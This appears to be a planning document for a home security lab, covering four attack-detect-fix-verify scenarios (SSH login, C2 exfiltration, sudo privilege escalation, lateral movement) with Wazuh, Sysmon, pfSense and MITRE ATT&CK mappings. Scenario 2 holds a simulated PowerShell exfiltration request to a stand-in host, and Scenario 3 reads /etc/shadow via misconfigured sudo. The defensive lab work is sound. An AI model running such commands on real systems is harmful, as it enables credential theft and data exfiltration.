# Planned Attack Scenarios

This document outlines 4 attack scenarios following the Attack -> Detect -> Fix -> Verify methodology.

---

## Scenario 1: "The Weakest Link" (SSH Brute Force)

**Focus:** Missing password on `webadmin`, Wazuh detection, Password Policy.

### Attack (Red Team)

- CALDERA attempts an SSH login as `webadmin` on the Linux server.
- Because `webadmin` has **no password set**, the login succeeds immediately on the first attempt.

### Detection (Wazuh SIEM)

- Wazuh agent on Linux sends logs to the SIEM.
- Visible in dashboard: Alert `SSHD: authentication failed` (multiple times) followed by `SSHD: authentication success`.
- **Technology:** Wazuh Log Analysis.

### Response / Remediation (Blue Team)

- Firewall is not used here (internal traffic).
- Connect to Linux and change the password to a strong passphrase.
- (Additional) Disable `PermitRootLogin` in `/etc/ssh/sshd_config`.
- **Technology:** OS Hardening & Password Policy.

### Verification

- Red Team repeats the SSH login as `webadmin`. A password prompt now appears and the attack is **unsuccessful** with wrong credentials.

---

## Scenario 2: "Call Home" (C2 Exfiltration)

**Focus:** pfSense Firewall, Network Containment, Sysmon.

> This is a scenario where pfSense plays the main role as traffic goes outside the network.

### Attack (Red Team)

- Malware is simulated on the Windows Workstation attempting to send "stolen data" to an external server (e.g., HTTP request to a public IP address or pastebin.com).
- Simulated PowerShell command:
  ```powershell
  Invoke-WebRequest -Uri "http://suspicious-site.com/data"
  ```

### Detection (Wazuh & Sysmon)

- Wazuh (with Sysmon) logs Event ID 1 (Process Create) and Event ID 3 (Network Connection).
- Visible in dashboard: PowerShell process opening a connection to an external IP.
- **Technology:** Sysmon + Wazuh.

### Response / Remediation (pfSense)

- Decision to "isolate" the infected machine from the Internet.
- Add rule at the top to block ouside access.
- **Technology:** pfSense Firewall Rules.

### Verification

- Malware tries again. Receives **Connection Timeout**.
- Wazuh displays "Firewall Block" event.

---

## Scenario 3: "Root for Free" (Privilege Escalation)

**Focus:** Configuration errors, FIM (File Integrity Monitoring).

### Attack (Red Team)

- Attacker is already on Linux (as `webadmin`).
- Types `sudo cat /etc/shadow` and obtains password hashes without entering a password (due to `NOPASSWD` in sudoers file).
- Modifies a system file (e.g., adds a new cron job).

### Detection (Wazuh FIM)

- Wazuh has a FIM module that monitors changes to critical files.
- Visible in dashboard: Alert `Integrity checksum changed for: /etc/crontab` or detection of sudo command in logs.
- **Technology:** Wazuh FIM.

### Response / Remediation (System Admin)

- Remove `NOPASSWD` from `/etc/sudoers`.
- Restore the original cron file.
- **Technology:** OS Configuration.

### Verification

- Attacker types `sudo ...`. System prompts for password. **Attack stopped.**

---

## Scenario 4: "Lateral Movement" (Network Spreading)

**Focus:** Windows Host Firewall, Segmentation (at host level).

### Attack (Red Team)

- CALDERA (`.53`) attempts to scan ports or connect via RDP to Windows (`.50`).
- Since Windows Firewall is disabled (as defined in Phase 0), the scan succeeds.

### Detection (Wazuh)

- Visible in dashboard: Wazuh alert `Windows Logon Failure` (if guessing passwords) or Inbound Traffic logs if enabled.
- **Technology:** Wazuh.

### Response / Remediation (Windows Firewall)

- Conclusion: `10.10.0.53` (CALDERA) should not communicate with the Windows client.
- Enable Windows Defender Firewall.
- Create Inbound rule: `Block IP 10.10.0.53`.
- **Technology:** Host-based Firewall.

### Verification

- CALDERA attempts to ping or RDP. Receives **"Request Timed Out"**.

---

## Technology Summary by Scenario

| Scenario | Attack | Detection (Wazuh) | Defense / Tool |
|----------|--------|-------------------|----------------|
| 1. Brute Force | SSH Login | Log Analysis (Auth Fail/Success) | Strong Passwords (OS) |
| 2. C2 / Exfil | Web Request | Sysmon (Process + Network Conn) | pfSense Firewall (Block WAN) |
| 3. Priv Esc | Sudo Abuse | FIM (File Change) + Sudo Logs | Config Fix (Sudoers) |
| 4. Lat. Move | RDP/Scan | Security Events (RDP + Scan) | Windows Firewall (Host FW) |

---

## Attack & Defend Matrix (MITRE ATT&CK)

### Scenario 1: SSH Brute Force

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Credential Access |
| **MITRE Technique** | T1110 - Brute Force |
| **MITRE Sub-technique** | T1110.001 - Password Guessing |
| **Target** | Linux Server (10.10.0.51) |
| **Attack Vector** | SSH protocol (port 22) |
| **Vulnerability** | No password |
| **Wazuh Detection Rules** | 5710, 5715, 100001, 100002 |
| **Detection Method** | Log Analysis - Authentication failures/success |
| **Remediation** | Change password to strong passphrase |
| **Defense Layer** | OS Hardening |

---

### Scenario 2: C2 Exfiltration

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Command and Control / Exfiltration |
| **MITRE Technique** | T1071 - Application Layer Protocol |
| **MITRE Sub-technique** | T1071.001 - Web Protocols |
| **Additional Technique** | T1041 - Exfiltration Over C2 Channel |
| **Target** | Windows Workstation (10.10.0.50) |
| **Attack Vector** | PowerShell HTTP request |
| **Vulnerability** | No outbound traffic filtering |
| **Wazuh Detection Rules** | 100020, 100021, 100023 |
| **Detection Method** | Sysmon Event ID 1 (Process) + Event ID 3 (Network) |
| **Remediation** | pfSense block rule for infected host |
| **Defense Layer** | Network Perimeter Firewall |

---

### Scenario 3: Privilege Escalation

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Privilege Escalation / Persistence |
| **MITRE Technique** | T1548 - Abuse Elevation Control Mechanism |
| **MITRE Sub-technique** | T1548.003 - Sudo and Sudo Caching |
| **Additional Technique** | T1053.003 - Scheduled Task/Job: Cron |
| **Target** | Linux Server (10.10.0.51) |
| **Attack Vector** | sudo with NOPASSWD misconfiguration |
| **Vulnerability** | `webadmin ALL=(ALL) NOPASSWD: ALL` in sudoers |
| **Wazuh Detection Rules** | 100011, 100012, 100040, 100041 |
| **Detection Method** | FIM - File Integrity Monitoring on /etc/crontab + sudo command logs |
| **Remediation** | Remove NOPASSWD from /etc/sudoers |
| **Defense Layer** | OS Configuration |

---

### Scenario 4: Lateral Movement

| Category | Details |
|----------|---------|
| **MITRE Tactic** | Lateral Movement / Discovery |
| **MITRE Technique** | T1021 - Remote Services |
| **MITRE Sub-technique** | T1021.001 - Remote Desktop Protocol |
| **Additional Technique** | T1046 - Network Service Discovery |
| **Target** | Windows Workstation (10.10.0.50) |
| **Attack Vector** | Port scan + RDP from CALDERA (10.10.0.53) |
| **Vulnerability** | Windows Firewall disabled |
| **Wazuh Detection Rules** | 100050, 100051 |
| **Detection Method** | Windows Security Events - Logon failures |
| **Remediation** | Enable Windows Firewall + Block rule for attacker IP |
| **Defense Layer** | Host-based Firewall |

---
